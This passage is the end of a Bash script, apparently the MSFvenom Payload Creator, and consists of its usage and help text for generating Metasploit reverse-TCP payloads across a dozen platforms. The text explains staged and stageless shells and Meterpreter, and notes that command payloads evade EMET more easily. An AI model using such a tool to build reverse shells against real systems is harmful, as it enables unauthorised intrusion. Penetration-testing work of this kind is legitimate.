  echo -e "\n ${YELLOW}[i]${RESET} Unknown type: ${YELLOW}${TYPE}${RESET}" >&2
fi


#-Done-----------------------------------------------------------------#


##### Done!
if [[ "$SUCCESS" == true ]]; then
  echo -e " ${GREEN}[?]${RESET} Quick ${GREEN}web server${RESET} for file transfer?   python -m SimpleHTTPServer 8080"
  echo -e " ${BLUE}[*]${RESET} ${BLUE}Done${RESET}!"
  exit 0
else
  echo -e "\n ${YELLOW}[i]${RESET} ${BLUE}${0}${RESET} <TYPE> (<DOMAIN/IP>) (<PORT>) (<STAGED/STAGELESS>) (<CMD/MSF>) (<LOOP/BATCH>) (<VERBOSE>)"
  echo -e " ${YELLOW}[i]${RESET}   Example: ${0} windows 192.168.1.10        # Windows & manual IP."
  echo -e " ${YELLOW}[i]${RESET}            ${0} elf eth0 4444               # Linux, eth0's IP & manual port."
  echo -e " ${YELLOW}[i]${RESET}            ${0} stageless cmd py verbose    # Python, stageless command prompt."
  echo -e " ${YELLOW}[i]${RESET}            ${0} loop eth1                   # A payload for every type, using eth1's IP."
  echo -e " ${YELLOW}[i]${RESET}            ${0} msf batch eth1              # All possible Meterpreter payloads, using eth1's IP."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <TYPE>: (All ${YELLOW}reverse TCP${RESET} payloads)"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASP${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}ASPX${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Java${RESET} [.${YELLOW}jsp${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Linux${RESET} [.${YELLOW}elf${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}OSX${RESET} [.${YELLOW}macho${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Perl${RESET} [.${YELLOW}pl${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}PHP${RESET}"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]"
  echo -e " ${YELLOW}[i]${RESET}   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET}]"
  echo ""
  echo -e " ${YELLOW}[i]${RESET} Rather than putting <DOMAIN/IP>, you can do a ${YELLOW}interface${RESET} and MPC will detect that IP address."
  echo -e " ${YELLOW}[i]${RESET} Missing <DOMAIN/IP> will default to the ${YELLOW}IP menu${RESET}."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} Missing <PORT> will default to ${YELLOW}443${RESET}."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <STAGED> splits the payload into parts, making it ${YELLOW}smaller but dependant on Metasploit${RESET}."
  echo -e " ${YELLOW}[i]${RESET} <STAGELESS> is the complete ${YELLOW}standalone payload${RESET}. More 'stabe' than <STAGELESS>."
  echo -e " ${YELLOW}[i]${RESET} Missing <STAGED/STAGELESS> will default to ${YELLOW}<STAGED>${RESET}."
  echo -e " ${YELLOW}[i]${RESET}   Note: Metasploit doesn't (yet!) support <STAGED> for every <TYPE> format."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <CMD> is a standard/${YELLOW}native command prompt${RESET}/terminal to interactive with."
  echo -e " ${YELLOW}[i]${RESET} <MSF> is a custom ${YELLOW}cross platform Meterpreter${RESET} shell, gaining the full power of Metasploit."
  echo -e " ${YELLOW}[i]${RESET}   Note: Metasploit doesn't (yet!) support <MSF>/<CMD> for every <TYPE> format."
  echo -e " ${YELLOW}[i]${RESET} Missing <CMD/MSF> will default to ${YELLOW}Meterpreter${RESET}."
  [[ "${VERBOSE}" == "true" ]] && echo -e " ${YELLOW}[i]${RESET} <CMD> payloads are generally much ${YELLOW}smaller${RESET} than <MSF> and easier to bypass EMET."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <BATCH> will generate ${YELLOW}as many combinations as possible${RESET}: <TYPE>, <STAGED> & <CMD/MSF>."
  echo -e " ${YELLOW}[i]${RESET} <LOOP> will just create ${YELLOW}one of each${RESET} <TYPE>."
  echo ""
  echo -e " ${YELLOW}[i]${RESET} <VERBOSE> will display ${YELLOW}more information${RESET} during the process."
  exit 1
fi
